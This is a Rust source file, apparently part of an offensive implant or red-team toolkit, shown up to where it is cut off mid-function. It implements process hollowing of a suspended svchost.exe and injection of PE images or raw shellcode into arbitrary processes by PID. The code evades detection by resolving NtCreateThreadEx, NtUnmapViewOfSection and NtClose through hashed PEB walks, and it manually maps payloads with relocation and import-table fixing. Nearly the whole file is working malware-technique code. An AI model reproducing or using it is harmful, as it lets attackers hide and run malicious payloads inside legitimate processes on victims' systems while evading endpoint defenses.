use anyhow::{anyhow, Result};
#[cfg(windows)]
use winapi::ctypes::c_void;

/// Section descriptor for `rva_to_file_offset_sections` — platform-agnostic
/// so the conversion logic can be unit-tested without `#[cfg(windows)]`.
#[cfg(any(windows, test))]
#[derive(Clone, Copy)]
struct SectionDesc {
    virtual_address: usize,
    virtual_size: usize,
    raw_offset: usize,
}

/// Walk a slice of `SectionDesc` entries and convert `rva` to a raw file offset.
///
/// Returns `rva` unchanged when no section contains it (header area, which maps
/// 1:1 for PE files with `SizeOfHeaders` bytes of header data).
#[cfg(any(windows, test))]
fn rva_to_file_offset_sections(rva: usize, sections: &[SectionDesc]) -> usize {
    for sec in sections {
        if rva >= sec.virtual_address && rva < sec.virtual_address + sec.virtual_size {
            return rva - sec.virtual_address + sec.raw_offset;
        }
    }
    // Fallback: header area (rva < SizeOfHeaders) maps 1:1.
    rva
}

/// Convert a Relative Virtual Address (RVA) from the PE optional-header data
/// directories to a raw file offset by walking the section table.
///
/// The data-directory fields (e.g. `IMAGE_DIRECTORY_ENTRY_BASERELOC`,
/// `IMAGE_DIRECTORY_ENTRY_IMPORT`) store *virtual* addresses relative to the
/// image base, **not** offsets into the on-disk file.  Using an RVA directly
/// as a file offset is only accidentally correct for packed/aligned images
/// where `VirtualAddress == PointerToRawData`.  For general PE files the two
/// values differ and we must walk the section headers.
///
/// # Safety
///
/// `nt` must point to a valid, fully-mapped `IMAGE_NT_HEADERS64` structure.
/// The section headers immediately following it must also be valid and in-bounds.
#[cfg(windows)]
unsafe fn rva_to_file_offset(
    rva: usize,
    nt: *const winapi::um::winnt::IMAGE_NT_HEADERS64,
) -> usize {
    let num_sections = (*nt).FileHeader.NumberOfSections as usize;
    let first = (nt as usize + std::mem::size_of::<winapi::um::winnt::IMAGE_NT_HEADERS64>())
        as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
    let descs: Vec<SectionDesc> = (0..num_sections)
        .map(|i| {
            let sec = &*first.add(i);
            SectionDesc {
                virtual_address: sec.VirtualAddress as usize,
                virtual_size: *sec.Misc.VirtualSize() as usize,
                raw_offset: sec.PointerToRawData as usize,
            }
        })
        .collect();
    rva_to_file_offset_sections(rva, &descs)
}

/// Hollow a new suspended svchost.exe process and execute the provided PE payload inside it.
#[cfg(windows)]
pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
    use std::mem::zeroed;
    use std::ptr::null_mut;
    use winapi::shared::basetsd::SIZE_T;
    use winapi::um::handleapi::CloseHandle;
    use winapi::um::memoryapi::{ReadProcessMemory, VirtualAllocEx, WriteProcessMemory};
    use winapi::um::processthreadsapi::{
        CreateProcessA, GetThreadContext, ResumeThread, SetThreadContext, PROCESS_INFORMATION,
        STARTUPINFOA,
    };
    use winapi::um::winbase::CREATE_SUSPENDED;
    use winapi::um::winnt::{
        CONTEXT, CONTEXT_FULL, IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS64,
        IMAGE_NT_SIGNATURE, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE,
    };

    // Resolve NtClose once; fall back to CloseHandle if unavailable
    let nt_close_addr = unsafe {
        pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0")).and_then(
            |base| pe_resolve::get_proc_address_by_hash(base, pe_resolve::hash_str(b"NtClose\0")),
        )
    };
    macro_rules! close_handle {
        ($h:expr) => {
            if let Some(addr) = nt_close_addr {
                type NtCloseFn = unsafe extern "system" fn(*mut c_void) -> i32;
                let nt_close: NtCloseFn = std::mem::transmute(addr as *const ());
                nt_close($h);
            } else {
                CloseHandle($h);
            }
        };
    }

    if payload.len() < 2 || payload[0] != b'M' || payload[1] != b'Z' {
        return Err(anyhow!(
            "hollow_and_execute: payload is not a PE (no MZ header)"
        ));
    }

    let dos = payload.as_ptr() as *const IMAGE_DOS_HEADER;
    let e_lfanew = unsafe { (*dos).e_lfanew } as usize;
    if e_lfanew + std::mem::size_of::<IMAGE_NT_HEADERS64>() > payload.len() {
        return Err(anyhow!("hollow_and_execute: PE too small for NT headers"));
    }
    let nt = (payload.as_ptr() as usize + e_lfanew) as *const IMAGE_NT_HEADERS64;
    unsafe {
        if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
            return Err(anyhow!("hollow_and_execute: invalid DOS signature"));
        }
        if (*nt).Signature != IMAGE_NT_SIGNATURE {
            return Err(anyhow!("hollow_and_execute: invalid NT signature"));
        }
        // Only PE64 (OptionalHeader Magic = 0x020B) is supported.  Reading
        // OptionalHeader fields through IMAGE_NT_HEADERS64 on a 32-bit PE
        // (Magic = 0x010B) would read from wrong offsets and produce garbage.
        let opt_magic = (*nt).OptionalHeader.Magic;
        if opt_magic != winapi::um::winnt::IMAGE_NT_OPTIONAL_HDR64_MAGIC {
            return Err(anyhow!(
                "hollow_and_execute: only PE64 payloads are supported (found OptionalHeader.Magic=0x{:x})",
                opt_magic
            ));
        }

        let image_size = (*nt).OptionalHeader.SizeOfImage as usize;
        let preferred_base = (*nt).OptionalHeader.ImageBase as usize;
        let entry_point_rva = (*nt).OptionalHeader.AddressOfEntryPoint as usize;

        let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".to_string());
        let host_path = format!("{}\\System32\\svchost.exe\0", sysroot);
        let host = host_path.as_bytes();
        let mut si: STARTUPINFOA = zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
        let mut pi: PROCESS_INFORMATION = zeroed();

        let ok = CreateProcessA(
            host.as_ptr() as _,
            null_mut(),
            null_mut(),
            null_mut(),
            0,
            CREATE_SUSPENDED,
            null_mut(),
            null_mut(),
            &mut si,
            &mut pi,
        );
        if ok == 0 {
            return Err(anyhow!(
                "CreateProcessA failed: {}",
                winapi::um::errhandlingapi::GetLastError()
            ));
        }

        // NtUnmapViewOfSection to hollow the original image
        // Use PEB walk via pe_resolve instead of GetModuleHandleA/GetProcAddress (2.3)
        let ntdll_base =
            pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
                .unwrap_or(0);
        if ntdll_base == 0 {
            tracing::warn!("hollow_and_execute: ntdll base not found via PEB; original image will not be unmapped");
        } else {
            let unmap_addr = pe_resolve::get_proc_address_by_hash(
                ntdll_base,
                pe_resolve::hash_str(b"NtUnmapViewOfSection\0"),
            )
            .unwrap_or(0);
            if unmap_addr == 0 {
                tracing::warn!(
                    "hollow_and_execute: NtUnmapViewOfSection not resolved; skipping unmap"
                );
            } else {
                type NtUnmapFn = extern "system" fn(*mut c_void, *mut c_void) -> i32;
                let nt_unmap: NtUnmapFn = std::mem::transmute(unmap_addr);

                let mut ctx: CONTEXT = zeroed();
                ctx.ContextFlags = CONTEXT_FULL;
                if GetThreadContext(pi.hThread, &mut ctx) == 0 {
                    tracing::warn!(
                        "hollow_and_execute: GetThreadContext failed ({}); skipping unmap",
                        winapi::um::errhandlingapi::GetLastError()
                    );
                } else {
                    // In a newly created x64 process, Rdx holds the PEB address
                    let peb_ptr = ctx.Rdx as *const u8;
                    let mut remote_image_base: usize = 0;
                    ReadProcessMemory(
                        pi.hProcess,
                        peb_ptr.add(0x10) as _,
                        &mut remote_image_base as *mut _ as _,
                        std::mem::size_of::<usize>(),
                        null_mut(),
                    );
                    if remote_image_base == 0 {
                        tracing::warn!(
                            "hollow_and_execute: remote_image_base is NULL; skipping unmap"
                        );
                    } else {
                        let unmap_status = nt_unmap(pi.hProcess, remote_image_base as _);
                        if unmap_status < 0 {
                            tracing::warn!("hollow_and_execute: NtUnmapViewOfSection returned 0x{:x}; continuing", unmap_status);
                        }
                    } // remote_image_base != 0
                } // GetThreadContext succeeded
            }
        }

        // Allocate with PAGE_READWRITE first; apply execute permission after writing (2.4)
        let remote_base_ptr = VirtualAllocEx(
            pi.hProcess,
            preferred_base as _,
            image_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        let remote_base_ptr = if remote_base_ptr.is_null() {
            let fallback = VirtualAllocEx(
                pi.hProcess,
                null_mut(),
                image_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );
            if fallback.is_null() {
                winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return Err(anyhow!("VirtualAllocEx failed for hollowing"));
            }
            fallback
        } else {
            remote_base_ptr
        };

        let remote_base = remote_base_ptr as usize;
        let mut written: SIZE_T = 0;

        // Write PE headers
        if WriteProcessMemory(
            pi.hProcess,
            remote_base_ptr,
            payload.as_ptr() as _,
            (*nt).OptionalHeader.SizeOfHeaders as usize,
            &mut written,
        ) == 0
        {
            winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return Err(anyhow!("WriteProcessMemory(headers) failed"));
        }

        // Write sections
        let num_sections = (*nt).FileHeader.NumberOfSections as usize;
        let first_section = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>())
            as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
        for i in 0..num_sections {
            let sec = &*first_section.add(i);
            let raw_off = sec.PointerToRawData as usize;
            let raw_sz = sec.SizeOfRawData as usize;
            let virt_sz = *sec.Misc.VirtualSize() as usize;
            let copy_sz = raw_sz.min(virt_sz);
            // Skip BSS / zero-initialised sections: PointerToRawData == 0 means
            // there is no on-disk data for this section; the OS zero-fills it
            // from the VirtualAlloc.  Also skip if the copy size is zero.
            if raw_off == 0 || raw_sz == 0 || raw_off + copy_sz > payload.len() || copy_sz == 0 {
                continue;
            }
            let dst = (remote_base + sec.VirtualAddress as usize) as *mut c_void;
            if WriteProcessMemory(
                pi.hProcess,
                dst,
                payload.as_ptr().add(raw_off) as _,
                copy_sz,
                &mut written,
            ) == 0
            {
                winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return Err(anyhow!("WriteProcessMemory(section {}) failed", i));
            }
        }

        let delta = remote_base as isize - preferred_base as isize;
        if delta != 0 {
            // Refuse to proceed if the PE has no relocation directory — applying
            // it at the wrong base without fixups will crash the hollowed process.
            let reloc_dir = &(*nt).OptionalHeader.DataDirectory
                [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
            if reloc_dir.VirtualAddress == 0 || reloc_dir.Size == 0 {
                winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
                close_handle!(pi.hThread);
                close_handle!(pi.hProcess);
                return Err(anyhow!("hollow_and_execute: VirtualAllocEx at preferred base failed and PE has no relocation directory; cannot fix up"));
            }
            apply_relocations_remote(pi.hProcess, remote_base, nt, payload, delta)?;
        }

        // Resolve and write the Import Address Table (2.2)
        fix_iat_remote(pi.hProcess, remote_base, nt, payload, &mut written)?;

        // Apply per-section memory protections now that the IAT has been written (2.4)
        apply_section_protections(pi.hProcess, remote_base, nt);

        // Flush the instruction cache for the entire mapped image so the CPU sees
        // the newly written code (L-04 fix).
        unsafe {
            winapi::um::processthreadsapi::FlushInstructionCache(
                pi.hProcess,
                remote_base as *mut c_void,
                (*nt).OptionalHeader.SizeOfImage as usize,
            );
        }

        // Update PEB.ImageBaseAddress
        let mut ctx: CONTEXT = zeroed();
        ctx.ContextFlags = CONTEXT_FULL;
        GetThreadContext(pi.hThread, &mut ctx);
        let peb_ptr = ctx.Rdx as *const u8;
        WriteProcessMemory(
            pi.hProcess,
            peb_ptr.add(0x10) as _,
            &remote_base as *const _ as _,
            std::mem::size_of::<usize>(),
            &mut written,
        );

        // Set new entry point (Rip, not Rcx — was 2.1 bug)
        ctx.Rip = (remote_base + entry_point_rva) as u64;
        SetThreadContext(pi.hThread, &ctx);
        ResumeThread(pi.hThread);

        close_handle!(pi.hThread);
        close_handle!(pi.hProcess);
    }
    Ok(())
}

#[cfg(windows)]
unsafe fn apply_relocations_remote(
    hprocess: *mut c_void,
    remote_base: usize,
    nt: *const winapi::um::winnt::IMAGE_NT_HEADERS64,
    payload: &[u8],
    delta: isize,
) -> Result<()> {
    use winapi::shared::basetsd::SIZE_T;
    use winapi::um::memoryapi::{ReadProcessMemory, WriteProcessMemory};

    let reloc_dir = &(*nt).OptionalHeader.DataDirectory
        [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
    if reloc_dir.VirtualAddress == 0 || reloc_dir.Size == 0 {
        return Ok(());
    }

    // Convert the relocation-directory RVA to a file offset.  The data-directory
    // VirtualAddress is a PE RVA, not a raw file offset; they differ when the
    // .reloc section has a different PointerToRawData than VirtualAddress.
    let reloc_file_off = rva_to_file_offset(reloc_dir.VirtualAddress as usize, nt);
    let reloc_end_off = reloc_file_off + reloc_dir.Size as usize;
    if reloc_end_off > payload.len() {
        return Ok(());
    }

    let mut offset = reloc_file_off;
    while offset + 8 <= reloc_end_off {
        let page_rva = u32::from_le_bytes(payload[offset..offset + 4].try_into().unwrap()) as usize;
        let block_size =
            u32::from_le_bytes(payload[offset + 4..offset + 8].try_into().unwrap()) as usize;
        if block_size < 8 {
            break;
        }
        let entries = (block_size - 8) / 2;
        for i in 0..entries {
            let entry_off = offset + 8 + i * 2;
            if entry_off + 2 > reloc_end_off {
                break;
            }
            let entry = u16::from_le_bytes(payload[entry_off..entry_off + 2].try_into().unwrap());
            let typ = (entry >> 12) as u8;
            let rel = (entry & 0x0FFF) as usize;
            if typ == 10 {
                // IMAGE_REL_BASED_DIR64
                let target = (remote_base + page_rva + rel) as *mut c_void;
                let mut val: u64 = 0;
                let mut rd: SIZE_T = 0;
                ReadProcessMemory(hprocess, target, &mut val as *mut _ as _, 8, &mut rd);
                val = val.wrapping_add(delta as u64);
                let mut wr: SIZE_T = 0;
                WriteProcessMemory(hprocess, target, &val as *const _ as _, 8, &mut wr);
            }
        }
        offset += block_size;
    }
    Ok(())
}

/// Inject a PE or shellcode payload into an existing process identified by PID.
#[cfg(windows)]
pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
    use std::ptr::null_mut;
    use winapi::shared::basetsd::SIZE_T;
    use winapi::um::handleapi::CloseHandle;
    use winapi::um::memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
    use winapi::um::processthreadsapi::{FlushInstructionCache, OpenProcess};
    use winapi::um::winnt::{
        IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS64, IMAGE_NT_SIGNATURE, MEM_COMMIT,
        MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_CREATE_THREAD,
        PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
    };

    unsafe {
        let hprocess = OpenProcess(
            PROCESS_VM_OPERATION
                | PROCESS_VM_WRITE
                | PROCESS_VM_READ
                | PROCESS_CREATE_THREAD
                | PROCESS_QUERY_INFORMATION,
            0,
            pid,
        );
        if hprocess.is_null() {
            return Err(anyhow!(
                "OpenProcess(pid={}) failed: {}",
                pid,
                winapi::um::errhandlingapi::GetLastError()
            ));
        }

        // Resolve NtClose for handle cleanup; fall back to CloseHandle
        let ntdll_base2 =
            pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
                .unwrap_or(0);
        let nt_close_addr2 = if ntdll_base2 != 0 {
            pe_resolve::get_proc_address_by_hash(ntdll_base2, pe_resolve::hash_str(b"NtClose\0"))
        } else {
            None
        };
        macro_rules! close_h {
            ($h:expr) => {
                if let Some(addr) = nt_close_addr2 {
                    type NtCloseFn = unsafe extern "system" fn(*mut c_void) -> i32;
                    let f: NtCloseFn = std::mem::transmute(addr as *const ());
                    f($h);
                } else {
                    CloseHandle($h);
                }
            };
        }

        // Resolve NtCreateThreadEx via PEB walk to avoid hookable CreateRemoteThread
        let ntdll_base =
            pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
                .unwrap_or(0);
        if ntdll_base == 0 {
            close_h!(hprocess);
            return Err(anyhow!("inject_into_process: ntdll not found"));
        }
        let ntcreate_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"NtCreateThreadEx\0"),
        )
        .ok_or_else(|| anyhow!("inject_into_process: NtCreateThreadEx not found"))?;
        type NtCreateThreadExFn = unsafe extern "system" fn(
            *mut *mut c_void,
            u32,
            *mut c_void,
            *mut c_void,
            *mut c_void,
            *mut c_void,
            u32,
            usize,
            usize,
            usize,
            *mut c_void,
        ) -> i32;
        let nt_create_thread: NtCreateThreadExFn = std::mem::transmute(ntcreate_addr);

        // Determine if this is a PE image or raw shellcode
        let is_pe = payload.len() >= 64 && payload[0] == b'M' && payload[1] == b'Z';
        if is_pe {
            let dos = payload.as_ptr() as *const IMAGE_DOS_HEADER;
            if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
                close_h!(hprocess);
                return Err(anyhow!("inject_into_process: invalid DOS magic"));
            }
            let nt =
                (payload.as_ptr() as usize + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;

            let nt_off = (*dos).e_lfanew as usize;
            if nt_off.saturating_add(std::mem::size_of::<IMAGE_NT_HEADERS64>()) > payload.len() {
                close_h!(hprocess);
                return Err(anyhow!(
                    "inject_into_process: e_lfanew ({nt_off:#x}) out of bounds for payload of {} bytes",
                    payload.len()
                ));
            }
            if (*nt).Signature != IMAGE_NT_SIGNATURE {
                close_h!(hprocess);
                return Err(anyhow!("inject_into_process: invalid NT signature"));
            }
            // Only PE64 (Magic = 0x020B) is supported.
            let opt_magic = (*nt).OptionalHeader.Magic;
            if opt_magic != winapi::um::winnt::IMAGE_NT_OPTIONAL_HDR64_MAGIC {
                close_h!(hprocess);
                return Err(anyhow!(
                    "inject_into_process: only PE64 payloads are supported (found Magic=0x{:x})",
                    opt_magic
                ));
            }

            let image_size = (*nt).OptionalHeader.SizeOfImage as usize;
            let preferred_base = (*nt).OptionalHeader.ImageBase as usize;
            let ep_rva = (*nt).OptionalHeader.AddressOfEntryPoint as usize;

            // 4.1: Verify the PE can be relocated if we cannot map at its preferred
            // base.  A PE without a relocation directory (.reloc section / reloc
            // DataDirectory) that is loaded at a different address will have all
            // absolute addresses broken — refuse to inject rather than inject
            // silently broken code.
            let reloc_dir = (*nt).OptionalHeader.DataDirectory
                [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
            let has_relocs = reloc_dir.VirtualAddress != 0 && reloc_dir.Size != 0;

            let remote_mem = VirtualAllocEx(
                hprocess,
                preferred_base as _,
                image_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );
            let remote_mem = if remote_mem.is_null() {
                if !has_relocs {
                    // Cannot load at preferred base and there is no reloc table.
                    close_h!(hprocess);
                    return Err(anyhow!(
                        "inject_into_process(pid={}): PE has no relocation directory and preferred \
                         base 0x{:x} is not available; cannot load at an alternative address",
                        pid, preferred_base
                    ));
                }
                VirtualAllocEx(
                    hprocess,
                    null_mut(),
                    image_size,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_READWRITE,
                )
            } else {
                remote_mem
            };

            if remote_mem.is_null() {
                close_h!(hprocess);
                return Err(anyhow!("VirtualAllocEx(pid={}) failed", pid));
            }

            let remote_base = remote_mem as usize;
            let mut written: SIZE_T = 0;
            WriteProcessMemory(
                hprocess,
                remote_mem,
                payload.as_ptr() as _,
                (*nt).OptionalHeader.SizeOfHeaders as usize,
                &mut written,
            );

            let num_sections = (*nt).FileHeader.NumberOfSections as usize;
            let first_section = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>())
                as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
            for i in 0..num_sections {
                let sec = &*first_section.add(i);
                let raw_off = sec.PointerToRawData as usize;
                let raw_sz = sec.SizeOfRawData as usize;
                let virt_sz = *sec.Misc.VirtualSize() as usize;
                let copy_sz = raw_sz.min(virt_sz);
                if raw_off == 0 || raw_sz == 0 || raw_off + copy_sz > payload.len() || copy_sz == 0 {
                    continue;
                }
                let dst = (remote_base + sec.VirtualAddress as usize) as *mut c_void;
                WriteProcessMemory(
                    hprocess,
                    dst,
                    payload.as_ptr().add(raw_off) as _,
                    copy_sz,
                    &mut written,
                );
            }

            let delta = remote_base as isize - preferred_base as isize;
            if delta != 0 {
                apply_relocations_remote(hprocess, remote_base, nt, payload, delta)?;
            }

            // Resolve IAT while memory is still writable (2.2)
            fix_iat_remote(hprocess, remote_base, nt, payload, &mut written)?;

            // Apply per-section protections after writing (2.4)
            apply_section_protections(hprocess, remote_base, nt);

            // Flush the instruction cache for the entire mapped image so the
            // CPU sees the newly-written code (L-04 fix).
            FlushInstructionCache(hprocess, remote_mem as *mut c_void, image_size);
            let entry = (remote_base + ep_rva) as *mut c_void;
            let mut h_thread: *mut c_void = null_mut();
            let status = nt_create_thread(
                &mut h_thread,
                0x1FFFFF,
                null_mut(),
                hprocess,
                entry,
                null_mut(),
                0,
                0,
                0,
                0,
                null_mut(),
            );
            if status < 0 || h_thread.is_null() {
                close_h!(hprocess);
                return Err(anyhow!(
                    "NtCreateThreadEx(pid={}) failed: {:x}",
                    pid,
                    status
                ));
            }
            close_h!(h_thread);
        } else {
            // Shellcode injection — allocate RW, write, protect RX, then thread
            let remote_mem = VirtualAllocEx(
                hprocess,
                null_mut(),
                payload.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );
            if remote_mem.is_null() {
                close_h!(hprocess);
                return Err(anyhow!("VirtualAllocEx(shellcode, pid={}) failed", pid));
            }
            let mut written: SIZE_T = 0;
            WriteProcessMemory(
                hprocess,
                remote_mem,
                payload.as_ptr() as _,
                payload.len(),
                &mut written,
            );
            let mut old_prot = 0u32;
            VirtualProtectEx(
                hprocess,
                remote_mem,
                payload.len(),
                PAGE_EXECUTE_READ,
                &mut old_prot,
            );
            // Flush I-cache before redirecting execution into the newly-written
            // shellcode (L-04 fix).
            FlushInstructionCache(hprocess, remote_mem, payload.len());
            let mut h_sc_thread: *mut c_void = null_mut();
            let sc_status = nt_create_thread(
                &mut h_sc_thread,
                0x1FFFFF,
                null_mut(),
                hprocess,
                remote_mem,
                null_mut(),
                0,
                0,
                0,
                0,
                null_mut(),
            );
            if sc_status < 0 || h_sc_thread.is_null() {
                close_h!(hprocess);
                return Err(anyhow!(
                    "NtCreateThreadEx(shellcode, pid={}) failed: {:x}",
                    pid,
                    sc_status
                ));
            }
            close_h!(h_sc_thread);
        }

        close_h!(hprocess);
    }
    Ok(())
}

/// Resolve each imported function in the payload's IAT and write addresses into
/// the remote process (2.2).  DLL addresses are resolved in the injector's own
/// address space — valid because system DLLs share ASLR offsets session-wide.
#[cfg(windows)]
unsafe fn fix_iat_remote(
    hprocess: *mut c_void,
    remote_base: usize,
    nt: *const winapi::um::winnt::IMAGE_NT_HEADERS64,
    payload: &[u8],
    written: &mut winapi::shared::basetsd::SIZE_T,
) -> Result<()> {
    use winapi::um::handleapi::CloseHandle;
    use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};
    use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
    use winapi::um::synchapi::WaitForSingleObject;
    use winapi::um::winbase::INFINITE;
    use winapi::um::winnt::{MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_READWRITE};

    // Resolve NtCreateThreadEx once for remote DLL loading (L-01/L-02 fix).
    let ntdll_base =
        pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0")).unwrap_or(0);
    let ntcreate_opt = if ntdll_base != 0 {
        pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"NtCreateThreadEx\0"),
        )
    } else {
        None
    };
    type NtCreateThreadExFn = unsafe extern "system" fn(
        *mut *mut c_void,
        u32,
        *mut c_void,
        *mut c_void,
        *mut c_void,
        *mut c_void,
        u32,
        usize,
        usize,
        usize,
        *mut c_void,
    ) -> i32;

    // LoadLibraryA address (used as the remote thread start routine).
    let kernel32_base =
        pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"KERNEL32.DLL\0")).unwrap_or(0);
    let load_lib_addr = if kernel32_base != 0 {
        pe_resolve::get_proc_address_by_hash(kernel32_base, pe_resolve::hash_str(b"LoadLibraryA\0"))
    } else {
        None
    };

    let import_dir = &(*nt).OptionalHeader.DataDirectory
        [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
    if import_dir.VirtualAddress == 0 {
        return Ok(());
    }

    // Convert import-directory RVA to file offset.  Each field in the import
    // descriptor (OriginalFirstThunk, Name, FirstThunk) is also an RVA and
    // must be converted before using it as a payload index.
    let mut desc_off = rva_to_file_offset(import_dir.VirtualAddress as usize, nt);
    loop {
        if desc_off + 20 > payload.len() {
            break;
        }
        let orig_first_thunk_rva =
            u32::from_le_bytes(payload[desc_off..desc_off + 4].try_into().unwrap()) as usize;
        let name_rva =
            u32::from_le_bytes(payload[desc_off + 12..desc_off + 16].try_into().unwrap()) as usize;
        let first_thunk_rva =
            u32::from_le_bytes(payload[desc_off + 16..desc_off + 20].try_into().unwrap()) as usize;
        if name_rva == 0 {
            break;
        }

        // Convert all three RVAs to file offsets.
        let name_off = rva_to_file_offset(name_rva, nt);
        let first_thunk_off = rva_to_file_offset(first_thunk_rva, nt);
        let thunk_rva_off = if orig_first_thunk_rva != 0 {
            rva_to_file_offset(orig_first_thunk_rva, nt)
        } else {
            first_thunk_off
        };

        if name_off >= payload.len() {
            desc_off += 20;
            continue;
        }

        let dll_name_bytes = &payload[name_off..];
        let null_pos = dll_name_bytes
            .iter()
            .position(|&b| b == 0)
            .unwrap_or(dll_name_bytes.len());
        let dll_name_str = match std::str::from_utf8(&dll_name_bytes[..null_pos]) {
            Ok(s) => s,
            Err(_) => {
                desc_off += 20;
                continue;
            }
        };
        let dll_name_lower = format!("{}\0", dll_name_str.to_ascii_lowercase());

        // Find/load the DLL in our process
        let hash = pe_resolve::hash_str(dll_name_lower.as_bytes());
        let local_existing = pe_resolve::get_module_handle_by_hash(hash);
        let dll_base = if let Some(b) = local_existing {
            b
        } else {
            // DLL was not already in our address space.  Load it into the
            // *target* process first so that:
            //   L-02: DLL_PROCESS_ATTACH fires in the target
            //   L-01: session-wide ASLR ensures both processes map the DLL at
            //         the same preferred base, so addresses we resolve locally
            //         remain valid remotely.
            if let (Some(nt_create_addr), Some(ll_addr)) = (ntcreate_opt, load_lib_addr) {
                let name_len = dll_name_lower.len(); // includes null terminator
                let remote_name = VirtualAllocEx(
                    hprocess,
                    std::ptr::null_mut(),
                    name_len,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_READWRITE,
                );
                if !remote_name.is_null() {
                    let mut wr = 0usize;
                    if WriteProcessMemory(
                        hprocess,
                        remote_name,
                        dll_name_lower.as_ptr() as _,
                        name_len,
                        &mut wr,
                    ) != 0
                    {
                        let nt_create_thread: NtCreateThreadExFn =
                            std::mem::transmute(nt_create_addr);
                        let mut h_thread: *mut c_void = std::ptr::null_mut();
                        let status = nt_create_thread(
                            &mut h_thread,
                            0x1FFFFF,
                            std::ptr::null_mut(),
                            hprocess,
                            ll_addr as *mut c_void,
                            remote_name,
                            0,
                            0,
                            0,
                            0,
                            std::ptr::null_mut(),
                        );
                        if status >= 0 && !h_thread.is_null() {
                            WaitForSingleObject(h_thread, INFINITE);
                            CloseHandle(h_thread);
                        } else {
                            tracing::warn!("fix_iat_remote: NtCreateThreadEx for remote LoadLibraryA failed: {:x}", status);
                        }
                    }
                    winapi::um::memoryapi::VirtualFreeEx(hprocess, remote_name, 0, MEM_RELEASE);
                }
            }
            // Now load locally — the preferred base will be established in the
            // target already so our function-address lookups match.
            let hmod = LoadLibraryA(dll_name_lower.as_ptr() as _);
            hmod as usize
        };

        if dll_base == 0 {
            tracing::warn!("fix_iat_remote: could not find/load {}", dll_name_str);
            desc_off += 20;
            continue;
        }

        let mut thunk_off = thunk_rva_off; // file offset into INT (import name table)
        // Track the IAT position as an RVA, not a file offset.  The remote process
        // maps PE sections at their virtual addresses (RVAs relative to image base),
        // so writes to the remote IAT must target `remote_base + IAT_RVA`, NOT
        // `remote_base + file_offset`.  The two values differ whenever the .idata
        // section has `PointerToRawData != VirtualAddress` (the common case for any
        // PE with a non-trivial section layout).
        let mut iat_rva = first_thunk_rva; // RVA for remote IAT write targets
        loop {
            if thunk_off + 8 > payload.len() {
                break;
            }
            let thunk_val =
                u64::from_le_bytes(payload[thunk_off..thunk_off + 8].try_into().unwrap());
            if thunk_val == 0 {
                break;
            }

            let func_addr: usize = if thunk_val & (1u64 << 63) != 0 {
                // Ordinal import
                let ord = (thunk_val & 0xFFFF) as usize;
                let ep = GetProcAddress(dll_base as _, ord as _);
                ep as usize
            } else {
                // Named import: thunk_val is an RVA to IMAGE_IMPORT_BY_NAME
                let ibn_rva = (thunk_val & 0x7FFF_FFFF) as usize;
                let ibn_off = rva_to_file_offset(ibn_rva, nt);
                if ibn_off + 2 >= payload.len() {
                    thunk_off += 8;
                    iat_rva += 8;
                    continue;
                }
                let name_start = ibn_off + 2; // skip 2-byte Hint
                let name_bytes = &payload[name_start..];
                let nlen = name_bytes
                    .iter()
                    .position(|&b| b == 0)
                    .unwrap_or(name_bytes.len());
                let mut name_null = name_bytes[..nlen].to_vec();
                name_null.push(0);
                let hash = pe_resolve::hash_str(&name_null);
                pe_resolve::get_proc_address_by_hash(dll_base, hash).unwrap_or_else(|| {
                    let ep = GetProcAddress(dll_base as _, name_null.as_ptr() as _);
                    ep as usize
                })
            };

            if func_addr != 0 {
                // Write the resolved address into the remote IAT entry.  Use the
                // RVA (not the file offset) to compute the remote target address.
